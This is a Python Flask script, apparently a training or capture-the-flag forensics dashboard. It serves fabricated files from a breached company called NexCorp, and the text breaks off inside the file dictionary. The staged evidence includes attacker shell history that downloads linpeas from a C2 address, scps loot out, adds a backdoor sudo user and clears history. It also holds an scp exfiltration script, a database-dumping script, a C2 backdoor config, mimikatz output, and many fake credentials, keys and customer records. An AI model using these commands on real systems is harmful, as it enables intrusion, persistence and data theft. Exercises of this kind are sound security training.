#!/usr/bin/env python3
"""
NexCorp SOC Dashboard v4
Run:  python3 nexcorp_dashboard_v4.py
Open: http://localhost:8888
Put images in ./logs/ folder:
  gate.jpg  lobby.jpg  serverroom.jpg  exit.jpg  armory.jpg
"""
from flask import Flask, Response, render_template_string, send_from_directory, abort
import os, json

app = Flask(__name__)
BASE = os.path.dirname(os.path.abspath(__file__))

# ── file contents loaded as JSON to avoid any escaping issues ──
FC = {
"/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\njbrown:x:1001:1001:James Brown,,,:/home/jbrown:/bin/bash\nmfemi:x:1002:1002:Michael Femi,,,:/home/mfemi:/bin/bash\ndeploy:x:1003:1003:Deploy User,,,:/home/deploy:/bin/bash\naokeke:x:1004:1004:Adaeze Okeke,,,:/home/aokeke:/bin/bash\nmysql:x:111:114:MySQL Server,,,:/var/lib/mysql:/bin/false\nnexcorp:x:1010:1010:NexCorp App,,,:/opt/nexcorp:/bin/bash",
"/etc/shadow": "root:$6$rG8.sK2a$X1HJKmP9nQvLzT3wB8dYeAoU7cF5iN0pRs4tVuMxEq1yWjCb6Z.:19073:0:99999:7:::\nwww-data:$6$mN7.xP3b$Y2IJLnQ0oRwMaU4vC9eZfBpV8dG6jO1qSt5uWvNyFr2zXkDc7A.:19070:0:99999:7:::\njbrown:$6$pK4.yQ5c$Z3JKMoR1pSxNbV5wD0fAgCqW9eH7kP2rTu6vXwOzGs3aYlEd8B.:19071:0:99999:7:::\nmfemi:$6$qL5.zR6d$A4KLNpS2qTyOcW6xE1gBhDrX0fI8lQ3sTv7wYxPaHt4bZmFe9C.:19072:0:99999:7:::\ndeploy:$6$rM6.aS7e$B5LMOqT3rUzPdX7yF2hCiEsY1gJ9mR4tUw8xZyQbIu5cAnGf0D.:19068:0:99999:7:::",
"/etc/hosts": "127.0.0.1       localhost\n127.0.1.1       srv-nexcorp-prod01\n\n172.16.4.23     srv-nexcorp-prod01\n172.16.4.31     db-nexcorp-mysql01\n172.16.4.18     mail-nexcorp-ex01\n172.16.4.10     nexcorp-dc01  NEXCORP-DC01\n172.16.2.11     wkstn-nxc-adm02\n192.168.10.5    cctv-hub-nxc-gf",
"/etc/hostname": "srv-nexcorp-prod01",
"/etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n\n0  2  *  *  *  root      /opt/nexcorp/scripts/db_backup.sh\n30 3  *  *  *  deploy    /opt/nexcorp/scripts/deploy_check.sh\n*/5 * *  *  *  root      /opt/nexcorp/scripts/healthcheck.sh\n@reboot        root      /opt/nexcorp/scripts/startup.sh\n\n# system\n17 * * * *  root    run-parts /etc/cron.hourly\n\n# persistence\n*/10 * * * *  root   /tmp/.x11-unix/.svc >/dev/null 2>&1",
"/etc/sudoers": "Defaults    env_reset\nroot    ALL=(ALL:ALL) ALL\n%sudo   ALL=(ALL:ALL) ALL\n\n# NexCorp\ndeploy  ALL=(ALL) NOPASSWD: /opt/nexcorp/scripts/deploy_check.sh\nnexcorp ALL=(ALL) NOPASSWD: ALL\nwww-data ALL=(ALL) NOPASSWD: /usr/sbin/apache2ctl",
"/etc/ssh/sshd_config": "Port 22\nListenAddress 0.0.0.0\nPermitRootLogin yes\nPasswordAuthentication yes\nPubkeyAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys",
"/etc/os-release": "NAME=\"Ubuntu\"\nVERSION=\"18.04.5 LTS (Bionic Beaver)\"\nID=ubuntu\nPRETTY_NAME=\"Ubuntu 18.04.5 LTS\"\nVERSION_ID=\"18.04\"",
"/root/.bash_history": "ssh root@172.16.4.31\nmysql -u root -pDBr00t@Nx2023!\ncat /etc/shadow\nfind / -perm -4000 -type f 2>/dev/null\ncat /var/www/html/config/db.php\ncat /opt/nexcorp/config/api_keys.txt\ntar czf /tmp/loot.tar.gz /opt/nexcorp/data /root/recon\nscp /tmp/loot.tar.gz 10.0.0.44:/received/\nwget http://10.0.0.44/linpeas.sh -O /tmp/linpeas.sh\nchmod +x /tmp/linpeas.sh\n/tmp/linpeas.sh > /tmp/linpeas_out.txt\nuseradd -m -s /bin/bash -G sudo backdoor\necho 'backdoor:P@ssw0rd123' | chpasswd\nhistory -c",
"/root/.ssh/authorized_keys": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZXQ8mNpR7vKjL2wE9hU3 root@kali\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpR7vKjL2wE9hU3tY5aB1cF6dG0sZXQ8mNpR7vKjL2wE9hU3 attacker@c2",
"/root/.ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz\nc2gtZWQyNTUxOQAAACBQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZXQ4xQ8mNpRw\nAAAJgq3xb3Kt8W9wAAAAtzc2gtZWQyNTUxOQAAACBQ8mNpR7vKjL2wE9hU3tY5\naB1cF6dG0sZXQ4xQ8mNpRwAAAEBxQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZX\nQ4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZXQ4xQ8mNpRwAAAA==\n-----END OPENSSH PRIVATE KEY-----",
"/root/recon/passwords_found.txt": "# Credentials harvested from NexCorp\n# Date: 2026-03-19\n\n[SSH / System]\nroot@172.16.4.23            Nx@Pr0d#R00t2024!\njbrown@172.16.4.23          James@Nexcorp1!\nmfemi@172.16.4.23           Mfemi#2024pass\ndeploy@172.16.4.23          d3pl0y_s3cr3t_99\nroot@172.16.4.31            DBr00t@Nx2023!\ndbadmin@172.16.4.31         dBadm1n_secure44\n\n[Database]\nnexcorp_app (MySQL)         Nx@Pr0d#2024!secretkey\nroot (MySQL)                DBr00t@Nx2023!\n\n[Domain - NEXCORP]\nkadmin                      K@dmin_NxC0rp!2025\nAdministrator               Adm1n#NxSrv2024\n\n[Web Portal]\nadmin@nexcorp.com           Admin#Nexcorp2024!\nit.support@nexcorp.com      Support@123\n\n[VPN] vpn.nexcorp.com:1194\nkadmin                      K@dmin_NxC0rp!2025\n\n[WiFi]\nNexCorp-Corp                Corp#Wifi2024!\n\n[CCTV]\nadmin@192.168.10.5          12345\noperator@192.168.10.5       nexcorp2024",
"/root/recon/nmap_full_internal.txt": "# Nmap 7.94 scan  NexCorp 172.16.0.0/16\n# Started: 2026-03-19 01:44:12\n\nHost: 172.16.4.23 (srv-nexcorp-prod01)\n22/tcp   open  ssh      OpenSSH 7.9p1\n80/tcp   open  http     Apache 2.4.41\n443/tcp  open  https    Apache 2.4.41\n3306/tcp open  mysql    MySQL 5.7.32\n8080/tcp open  http     Tomcat 9.0.41\n4444/tcp open  BACKDOOR reverse shell\n2222/tcp open  BACKDOOR secondary SSH\n\nHost: 172.16.4.31 (db-nexcorp-mysql01)\n22/tcp   open  ssh\n3306/tcp open  mysql    MySQL 5.7.32\n6379/tcp open  redis\n\nHost: 172.16.4.10 (NEXCORP-DC01)\n53/tcp   open  dns\n88/tcp   open  kerberos\n389/tcp  open  ldap\n445/tcp  open  smb\n3389/tcp open  rdp\n\nHost: 192.168.10.5 (cctv-hub-nxc-gf)\n22/tcp   open  ssh      Dropbear\n80/tcp   open  http     Hikvision web\n554/tcp  open  rtsp     RTSP server",
"/root/recon/users_harvested.txt": "# Users discovered across NexCorp\n\n[Linux System Users]\njbrown    - James Brown      - Senior DevOps Engineer\nmfemi     - Michael Femi     - Backend Developer\ndeploy    - Deploy User      - CI/CD service account\naokeke    - Adaeze Okeke     - QA Engineer\n\n[Active Directory - NEXCORP.LOCAL]\nkadmin          - Domain Administrator\nAdministrator   - Built-in Administrator\nceo.nexcorp     - Chukwuemeka Obi  - CEO\ncfo.nexcorp     - Ngozi Eze        - CFO\ncto.nexcorp     - Tunde Adeleke    - CTO\nhr.manager      - Amaka Okafor     - HR Manager\nit.support      - IT Support Shared\n[214 Exchange mailboxes indexed]",
"/root/loot/db_credentials.txt": "# Database credentials - NexCorp\n\nMySQL Production (172.16.4.31:3306)\n  root:         DBr00t@Nx2023!\n  nexcorp_app:  Nx@Pr0d#2024!secretkey\n  nexcorp_ro:   N3xc0rp_R3ad0nly\n  replication:  Nx_Repl1c@_2024\n\nRedis (172.16.4.31:6379)\n  password:     R3d1s_NxC@che99\n\nRabbitMQ (172.16.4.31:5672)\n  admin:        NxRabbit#MQ2024",
"/root/loot/shadow_hashes.txt": "root:$6$rG8.sK2a$X1HJKmP9nQvLzT3wB8dYeAoU7cF5iN0pRs4tVuMxEq1yWjCb6Z.\njbrown:$6$pK4.yQ5c$Z3JKMoR1pSxNbV5wD0fAgCqW9eH7kP2rTu6vXwOzGs3aYlEd8B.\nmfemi:$6$qL5.zR6d$A4KLNpS2qTyOcW6xE1gBhDrX0fI8lQ3sTv7wYxPaHt4bZmFe9C.\n\n# Cracked:\njbrown   -> James@Nexcorp1!\nmfemi    -> Mfemi#2024pass\ndeploy   -> d3pl0y_s3cr3t_99",
"/root/loot/session_tokens.txt": "# Session tokens harvested from web app\n\nejJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW5AbmV4Y29ycC5jb20iLCJyb2xlIjoiYWRtaW4ifQ.4xQ8mNpR7vK  [admin - ADMIN role]\nejJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiY2VvQG5leGNvcnAuY29tIiwicm9sZSI6ImNlbyJ9.vKjL2wE9hU3  [ceo - CEO role]\nejJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZmluYW5jZUBuZXhjb3JwLmNvbSIsInJvbGUiOiJmaW5hbmNlIn0.tY5a  [finance]",
"/var/www/html/wp-config.php": "<?php\ndefine('DB_NAME', 'nexcorp_wp');\ndefine('DB_USER', 'wp_nexcorp');\ndefine('DB_PASSWORD', 'WP_Nx@2024pass!');\ndefine('DB_HOST', '172.16.4.31');\ndefine('AUTH_KEY', 'Nx_Auth_K3y_2026_secret!');\ndefine('WP_DEBUG', false);\n$table_prefix = 'nx_';\nrequire_once ABSPATH . 'wp-settings.php';",
"/var/www/html/config/db.php": "<?php\n// NexCorp Production DB Config - CONFIDENTIAL\n\ndefine('DB_HOST', '172.16.4.31');\ndefine('DB_PORT', '3306');\ndefine('DB_NAME', 'nexcorp_prod');\ndefine('DB_USER', 'nexcorp_app');\ndefine('DB_PASS', 'Nx@Pr0d#2024!secretkey');\n\ndefine('REDIS_HOST', '172.16.4.31');\ndefine('REDIS_PASS', 'R3d1s_NxC@che99');\n?>",
"/var/www/html/config/stripe_keys.php": "<?php\n// STRIPE PRODUCTION - HIGHLY CONFIDENTIAL\n\ndefine('STRIPE_SECRET',    'sk_live_4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZ');\ndefine('STRIPE_PUBLIC',    'pk_live_7tY5aB1cF6dG0sZxQ8mNpR4vKjL2wE9hU3');\ndefine('STRIPE_WEBHOOK',   'whsec_9hU3tY5aB1cF6dG0sZxQ8mNpR7vKjL2wE4');\ndefine('PAYSTACK_SECRET',  'sk_live_8aB1cF6dG0sZxQ8mNpR7vKjL2wE9hU3tY5');\n?>",
"/var/www/html/config/app.php": "<?php\nreturn [\n    'name'    => 'NexCorp Portal',\n    'env'     => 'production',\n    'debug'   => false,\n    'url'     => 'https://app.nexcorp.com',\n    'timezone'=> 'Africa/Lagos',\n    'key'     => 'base64:4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dGNexCorp2026==',\n    'cipher'  => 'AES-256-CBC',\n];",
"/var/www/html/config/mail.php": "<?php\nreturn [\n    'driver'   => 'smtp',\n    'host'     => '172.16.4.18',\n    'port'     => 587,\n    'username' => 'noreply@nexcorp.com',\n    'password' => 'M@il_Nx2024#smtp',\n    'encryption' => 'tls',\n];",
"/opt/nexcorp/config/production.env": "APP_ENV=production\nAPP_KEY=base64:4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dGNexCorp2026==\nAPP_DEBUG=false\nAPP_URL=https://app.nexcorp.com\n\nDB_HOST=172.16.4.31\nDB_DATABASE=nexcorp_prod\nDB_USERNAME=nexcorp_app\nDB_PASSWORD=Nx@Pr0d#2024!secretkey\n\nMAIL_HOST=172.16.4.18\nMAIL_USERNAME=noreply@nexcorp.com\nMAIL_PASSWORD=M@il_Nx2024#smtp\n\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7NEXCORP\nAWS_SECRET_ACCESS_KEY=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\nAWS_BUCKET=nexcorp-prod-backups-eu\n\nJWT_SECRET=NxC0rp_JWT_S3cr3t_2026_Pr0d_K3y!\n\nREDIS_HOST=172.16.4.31\nREDIS_PASSWORD=R3d1s_NxC@che99\n\nSTRIPE_SECRET=sk_live_4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZ",
"/opt/nexcorp/config/api_keys.txt": "# NexCorp External API Keys - CONFIDENTIAL\n\n[Stripe Production]\nSecret:      sk_live_4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZ\nPublishable: pk_live_7tY5aB1cF6dG0sZxQ8mNpR4vKjL2wE9hU3\n\n[Google Cloud]\nProject:     nexcorp-production-441\nAPI Key:     AIzaSyD_4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6d\n\n[Twilio SMS]\nAccount SID: AC4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0s\nAuth Token:  8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZ4xQ\n\n[SendGrid]\nAPI Key:     SG.4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZ8mN\n\n[Slack Webhook]\nURL: https://hooks.slack.com/services/T04NX/B04RP/4xQ8mNpR7vKjL",
"/opt/nexcorp/config/jwt_secret.txt": "NxC0rp_JWT_S3cr3t_2026_Pr0d_K3y!_do_not_share",
"/opt/nexcorp/finance/q3_payroll.csv": "EmployeeID,Name,Department,Bank,AccountNo,GrossPay,NetPay\nNX001,Chukwuemeka Obi,Executive,FirstBank,3044812901,2500000,1875000\nNX002,Ngozi Eze,Finance,GTBank,0123456789,1800000,1350000\nNX003,Tunde Adeleke,Technology,Zenith,2098765432,1650000,1237500\nNX004,Amaka Okafor,HR,UBA,1023456789,950000,712500\nNX005,James Brown,Technology,Access,0987654321,880000,660000\nNX006,Michael Femi,Technology,GTBank,0765432198,820000,615000\nNX007,Adaeze Okeke,Technology,FirstBank,3044899001,800000,600000\n[+197 more rows]",
"/opt/nexcorp/finance/bank_details.xlsx": "[Excel Binary - 84 KB]\nSheets: Corporate_Accounts, Suppliers, Payroll_Disbursement\n\nCorporate_Accounts:\nBank: First Bank Nigeria\nAccount: 2044812901 | NexCorp Industries Ltd\nBalance (Mar 2026): NGN 847,234,000\n\nBank: GTBank\nAccount: 0012345678 | NexCorp Industries Ltd (Ops)\nBalance: NGN 124,500,000",
"/opt/nexcorp/finance/board_salaries.xlsx": "[Excel Binary - 44 KB]\n\nBoard Compensation 2026:\nCEO  - Chukwuemeka Obi  - NGN 30,000,000/yr\nCFO  - Ngozi Eze        - NGN 21,600,000/yr\nCTO  - Tunde Adeleke    - NGN 19,800,000/yr\nChair - Chief Adeyemi   - NGN 12,000,000/yr",
"/opt/nexcorp/scripts/db_backup.sh": "#!/bin/bash\nDATE=$(date +%Y-%m-%d)\nDB_HOST=172.16.4.31\nDB_PASS=Nx@Pr0d#2024!secretkey\nDB_NAME=nexcorp_prod\nS3_BUCKET=s3://nexcorp-prod-backups-eu\nAWS_KEY=AKIAIOSFODNN7NEXCORP\nAWS_SECRET=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\n\nmysqldump -h $DB_HOST -u nexcorp_app -p$DB_PASS $DB_NAME > /opt/nexcorp/backups/db_backup_$DATE.sql\ngzip /opt/nexcorp/backups/db_backup_$DATE.sql\naws s3 cp /opt/nexcorp/backups/db_backup_$DATE.sql.gz $S3_BUCKET/",
"/opt/nexcorp/scripts/healthcheck.sh": "#!/bin/bash\nSERVICES=(apache2 mysql redis tomcat9)\nSLACK=https://hooks.slack.com/services/T04NX/B04RP/4xQ8mNpR7vKjL\n\nfor svc in ${SERVICES[@]}; do\n  if ! systemctl is-active --quiet $svc; then\n    curl -X POST -H 'Content-type: application/json' \\\n      --data '{\"text\":\"Service DOWN: '$svc'\"}' $SLACK\n  fi\ndone",
"/home/jbrown/.env": "DB_PASS=James@Nexcorp1!\nGITHUB_TOKEN=ghp_4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0\nAWS_KEY=AKIAIOSFODNN7JBROWN\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYJBROWN\nDIGITAL_OCEAN_TOKEN=dop_v1_4xQ8mNpR7vKjL2wE9hU3tY5\nPERSONAL_VPN_PASS=Jbr0wn_VPN#99",
"/home/jbrown/notes.txt": "TODO:\n- Renew SSL cert on prod (expires May 2026)\n- Patch Tomcat CVE-2019-0708 - CRITICAL still open\n- Password reset for mfemi (using: Mfemi#2024pass)\n- CCTV default creds admin:12345 - NEED TO CHANGE\n\nServer IPs:\nprod:  172.16.4.23\ndb:    172.16.4.31\nmail:  172.16.4.18\ndc01:  172.16.4.10\ncctv:  192.168.10.5\n\nkadmin password: K@dmin_NxC0rp!2025\nold:             K@dmin2024#corp\nBackup key: NxB@ckup_K3y_2026!enc",
"/home/jbrown/TODO.txt": "[ ] Patch Tomcat CVE-2019-0708 - HIGH PRIORITY\n[ ] Change CCTV default password (admin:12345)\n[ ] Rotate AWS keys (last: 2024-06-01)\n[ ] Review sudoers - nexcorp has NOPASSWD:ALL\n[x] Deploy Q1 payroll update\n[x] Onboard aokeke account",
"/home/jbrown/.bash_history": "cd /opt/nexcorp\ncat config/production.env\nssh root@172.16.4.31\nmysql -h 172.16.4.31 -u nexcorp_app -pNx@Pr0d#2024!secretkey nexcorp_prod\nvim /opt/nexcorp/config/production.env\ngit status",
"/home/jbrown/deploy_keys/prod_deploy_key": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAA...(NexCorp Deploy Key - prod01)...\nAAABIwAAAIEA4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZXQ8mNpR7vKjL2wE9\nhU3tY5aB1cF6dG0sZXQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0sZXQ8mNpR7\n-----END OPENSSH PRIVATE KEY-----",
"/home/mfemi/passwords.txt": "# personal passwords - KEEP PRIVATE\n\nnexcorp portal:    Mfemi#2024pass\ngmail:             mfemi.private@gmail.com / Mf3mi_Gm@il99!\ninternet banking:  FirstBank / Mf3mi_B@nk2024\ngithub:            mfemi_dev / Git#Mfemi2024\nhome wifi:         HomeNet_Mfemi#1\nlaptop:            MFemi@laptop2023",
"/home/mfemi/.bash_history": "cd /opt/nexcorp\ngit pull origin main\ncat config/production.env\nssh jbrown@172.16.4.23\nvim passwords.txt\nmysql -h 172.16.4.31 -u nexcorp_app -pNx@Pr0d#2024!secretkey",
"/tmp/.svc": "[ELF Binary - 184 bytes]\nPersistent reverse shell beacon\nC2: 10.0.0.44:4444\nInterval: 10 minutes\nEncryption: AES-256",
"/tmp/linpeas_out.txt": "Linux Privilege Escalation Awesome Script\n\n[+] Interesting SUID files:\n/usr/bin/python3.6 (SUID - privesc possible)\n/usr/bin/find\n\n[+] Cron jobs:\n*/10 * * * * root /tmp/.x11-unix/.svc\n\n[+] Files with passwords:\n/opt/nexcorp/config/production.env\n/var/www/html/config/db.php\n/home/jbrown/.env\n/opt/nexcorp/scripts/db_backup.sh\n\n[+] SSH keys:\n/root/.ssh/id_rsa (PRIVATE)\n/home/jbrown/.ssh/id_rsa (PRIVATE)\n\n[+] Sudo misconfig:\nnexcorp ALL=(ALL) NOPASSWD: ALL",
"/root/.mysql_history": "show databases;\nuse nexcorp_prod;\nshow tables;\nselect count(*) from customers;\nselect email,password from users limit 20;\nmysqldump -u root -p nexcorp_prod > /root/dump/nexcorp_full_2026-03-21.sql\nselect email,password from users where role='admin';\ngrant all on *.* to 'backdoor'@'%' identified by 'P@ssw0rd123';\nflush privileges;",
"/root/dump/users_plain.txt": "# nexcorp_prod passwords cracked\n# Total: 847 / 1240\n\nemail                        | password\n-----------------------------|---------------------------\nadmin@nexcorp.com            | Admin#Nexcorp2024!\nceo@nexcorp.com              | Ch1ef3x3c#2024Nx\nfinance@nexcorp.com          | F1n@nce_Nx2024\njbrown@nexcorp.com           | James@Nexcorp1!\nmfemi@nexcorp.com            | Mfemi#2024pass\naokeke@nexcorp.com           | Adaeze@Nx99!\nhr.manager@nexcorp.com       | HR_M@nager_2024\nit.support@nexcorp.com       | Support@123\nkadmin@nexcorp.com           | K@dmin_NxC0rp!2025\ncto@nexcorp.com              | CTO_NxC0rp#2025!\ncfo@nexcorp.com              | CFO_Nx_F1n@nce2024\n[+836 more accounts]",
"/root/dump/schema.txt": "-- nexcorp_prod schema\n\nTables (34):\n  customers   - 48,240 rows (id,name,email,phone,address,card_last4)\n  employees   - 1,204 rows  (id,name,email,role,salary,bank_acct,dob)\n  users       - 1,240 rows  (id,email,password_hash,role,last_login)\n  invoices    - 184,201 rows\n  payments    - 92,440 rows (card_hash,amount,gateway)\n  sessions    - 3,841 rows  (token,expires,ip)\n  audit_log   - 441,200 rows",
"/root/dump/customers_pii.csv": "id,name,email,phone,address,joined\n1,Emeka Okonkwo,emeka.o@gmail.com,08012345678,14 Adeola Odeku Lagos,2023-01-15\n2,Chioma Nwosu,chioma.n@yahoo.com,08023456789,22 Allen Ave Ikeja,2023-02-20\n3,Bayo Adeleke,bayo.a@hotmail.com,08034567890,5 Broad St Lagos Island,2023-03-10\n4,Ngozi Eze,n.eze@gmail.com,08045678901,31 Marina Lagos,2023-04-05\n[+48,236 more rows - 4.8 MB total]",
"/home/dbadmin/creds.txt": "# DB Admin Credentials\n\nMySQL root:         DBr00t@Nx2023!\nMySQL nexcorp_app:  Nx@Pr0d#2024!secretkey\nMySQL replication:  Nx_Repl1c@_2024\nRedis:              R3d1s_NxC@che99\nRabbitMQ:           NxRabbit#MQ2024\nBackup SSH:         backup@172.16.4.50 / BkUp_NxC0rp!44",
"/home/dbadmin/.my.cnf": "[client]\nuser=root\npassword=DBr00t@Nx2023!\nhost=localhost",
"/home/dbadmin/backup.sh": "#!/bin/bash\nDATE=$(date +%Y%m%d)\nmysqldump -u root -pDBr00t@Nx2023! nexcorp_prod | gzip > /var/backups/db_$DATE.sql.gz\necho Backup done | mail -s DB_Backup it.support@nexcorp.com",
"/etc/mysql/my.cnf": "[mysqld]\nuser            = mysql\nport            = 3306\nbasedir         = /usr\ndatadir         = /var/lib/mysql\nbind-address    = 0.0.0.0\nmax_connections = 200\ninnodb_buffer_pool_size = 4G",
"/etc/mysql/debian.cnf": "[client]\nhost     = localhost\nuser     = debian-sys-maint\npassword = NxMySQL_d3b_maint!2024\nsocket   = /var/run/mysqld/mysqld.sock",
"/root/.backdoor/config.json": "{\n  \"c2\": \"10.0.0.44\",\n  \"port\": 5555,\n  \"interval\": 300,\n  \"encryption\": \"aes-256-gcm\",\n  \"key\": \"4xQ8mNpR7vKjL2wE9hU3tY5aB1cF6dG0\",\n  \"persist\": true\n}",
"/root/exfil/transfer.sh": "#!/bin/bash\nC2=10.0.0.44\nfor f in /root/dump/nexcorp_full_2026-03-21.sql /root/dump/users_plain.txt /root/dump/customers_pii.csv /home/dbadmin/creds.txt; do\n  scp -i /root/.ssh/id_rsa $f root@$C2:/received/ &\ndone\nwait\necho Transfer complete",
"/root/exfil/mysql_exfil.py": "import pymysql, csv\n\nconn = pymysql.connect(host='172.16.4.31', user='root', password='DBr00t@Nx2023!', db='nexcorp_prod')\ncur = conn.cursor()\n\nfor table in ['customers','employees','users','payments']:\n    cur.execute(f'SELECT * FROM {table}')\n    rows = cur.fetchall()\n    with open(f'/root/dump/{table}.csv','w') as f:\n        csv.writer(f).writerows(rows)\n    print(f'[+] {table}: {len(rows)} rows dumped')\nconn.close()",
"/tmp/dumpfile.sql": "-- MySQL dump  NexCorp Production\n-- Dump date: 2026-03-21 03:44:12\n\nCREATE DATABASE IF NOT EXISTS nexcorp_prod;\nUSE nexcorp_prod;\n\nCREATE TABLE customers (\n  id int AUTO_INCREMENT PRIMARY KEY,\n  name varchar(255),\n  email varchar(255),\n  phone varchar(20),\n  card_last4 char(4)\n);\n-- [48,240 rows inserted]\n-- [File continues for 2.1 GB]",
"C:\\Temp\\mimikatz_output.txt": "mimikatz 2.2.0 (x64)\n\nAuthentication Id : 0 ; 447123\nUser Name         : kadmin\nDomain            : NEXCORP\nLogon Server      : NEXCORP-DC01\n\nmsv:\n * NTLM     : a87f3a337d73085c45f9416be5787d86\n * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709\n\nwdigest:\n * Username : kadmin\n * Domain   : NEXCORP\n * Password : K@dmin_NxC0rp!2025\n\nkerberos:\n * Password : K@dmin_NxC0rp!2025\n\ncredman:\n * Username : Administrator\n * Password : Adm1n#NxSrv2024",
"C:\\Users\\kadmin\\Desktop\\nexcorp_passwords_backup.txt": "# NexCorp Password Backup - STRICTLY CONFIDENTIAL\n# Owner: kadmin  Date: 2026-03-01\n\n[Domain Admin]\nkadmin         K@dmin_NxC0rp!2025\nAdministrator  Adm1n#NxSrv2024\n\n[Server Access]\nprod01 SSH     Nx@Pr0d#R00t2024!\ndb01 SSH       DBr00t@Nx2023!\nmail01 Admin   Exch@nge_Nx2024!\n\n[VPN] vpn.nexcorp.com\nPassword:      K@dmin_NxC0rp!2025\n\n[Personal]\nMicrosoft 365  K@dmin_M365!\nLastPass:      L@stP@ss_Nx_K2024!\nOnline banking: K@dmin_GT2024!",
"C:\\Users\\kadmin\\Desktop\\VPN_access.txt": "NexCorp VPN\n-----------\nGateway:  vpn.nexcorp.com:1194\nProtocol: OpenVPN / Cisco AnyConnect\n\nUsername: kadmin@nexcorp.com\nPassword: K@dmin_NxC0rp!2025\nMFA:      Google Authenticator\nBackup code: 84729-10384",
"C:\\Users\\kadmin\\Desktop\\server_map.xlsx": "[Excel Binary - 128 KB]\n\nProduction Servers:\nHostname              IP             OS                Role\nsrv-nexcorp-prod01    172.16.4.23    Ubuntu 18.04      Web/App\ndb-nexcorp-mysql01    172.16.4.31    Debian 10         Database\nmail-nexcorp-ex01     172.16.4.18    Win Server 2016   Exchange\nNEXCORP-DC01          172.16.4.10    Win Server 2019   AD/DNS\ncctv-hub-nxc-gf       192.168.10.5   Embedded Linux    CCTV NVR  (admin/12345)",
"C:\\Users\\kadmin\\Documents\\VPN_Credentials.docx": "[Word Document - 44 KB]\n\nNexCorp IT - VPN Credentials\n\nUser: kadmin@nexcorp.com\nPassword: K@dmin_NxC0rp!2025\nMFA backup codes: 84729-10384, 22918-55201",
"C:\\Users\\kadmin\\Documents\\NexCorp_Q1_Budget.xlsx": "[Excel Binary - 2.8 MB]\n\nQ1 2026 Summary:\nTotal Revenue:    NGN 2,841,000,000\nTotal OPEX:       NGN 1,204,000,000\nNet Profit:       NGN 841,000,000\nHeadcount:        204 employees\nPayroll:          NGN 284,000,000",
"C:\\Users\\kadmin\\Documents\\Work\\Server_Credentials_MASTER.xlsx": "[Excel Binary - 188 KB]\n\nLinux Servers:\nsrv-nexcorp-prod01  root  Nx@Pr0d#R00t2024!\ndb-nexcorp-mysql01  root  DBr00t@Nx2023!\n\nWindows:\nNEXCORP-DC01   Administrator  Adm1n#NxSrv2024\nmail-nexcorp   Administrator  Exch@nge_Nx2024!",
"C:\\Users\\kadmin\\Documents\\Work\\Firewall_Rules_Export.csv": "RuleID,Name,Source,Destination,Port,Action\n1,Allow_HTTP,any,172.16.4.23,80,ALLOW\n2,Allow_HTTPS,any,172.16.4.23,443,ALLOW\n3,Allow_SSH_Admin,10.0.0.0/8,172.16.0.0/16,22,ALLOW\n4,Allow_MySQL_Internal,172.16.0.0/16,172.16.4.31,3306,ALLOW\n5,BLOCK_EXTERNAL_3306,any,172.16.4.31,3306,DENY\n6,BLOCK_EXTERNAL_6379,any,172.16.4.31,6379,DENY",
"C:\\Users\\Administrator\\Desktop\\exchange_admin_notes.txt": "Exchange 2019 Admin Notes\n\nServer: mail-nexcorp-ex01 (172.16.4.18)\nAdmin URL: https://172.16.4.18/ecp\nOWA URL: https://mail.nexcorp.com/owa\n\nUsername: administrator\nPassword: Exch@nge_Nx2024!\n\nMailboxes: 214 active\nDB size: 284 GB\n\nNOTE: ProxyLogon STILL NOT PATCHED (scheduled Q2 2026)",
"C:\\Users\\Administrator\\Desktop\\server_ips_internal.txt": "# NexCorp Internal Network\n\n[Production]\n172.16.4.23   srv-nexcorp-prod01   Ubuntu 18.04  jbrown\n172.16.4.31   db-nexcorp-mysql01   Debian 10     dbadmin\n172.16.4.18   mail-nexcorp-ex01    Win 2016      kadmin\n172.16.4.10   NEXCORP-DC01         Win 2019      kadmin\n172.16.4.50   backup-nexcorp-01    Ubuntu 20.04  kadmin\n\n[Workstations]\n172.16.2.11   wkstn-nxc-adm02   kadmin\n172.16.2.12   wkstn-nxc-ceo01   CEO\n\n[CCTV]\n192.168.10.5  cctv-hub-nxc-gf   admin/12345\n\n[VPN] 10.0.0.0/24 Cisco AnyConnect",
"C:\\Users\\Administrator\\Desktop\\recovery_key.txt": "BitLocker Recovery Key - NEXCORP-DC01\nKey ID: 4A8F2E1B-9C3D-4F7A-8E2B-1A4C9D3E7F2A\nKey:    481024-294816-551872-148096-392064-148736-295808-427008",
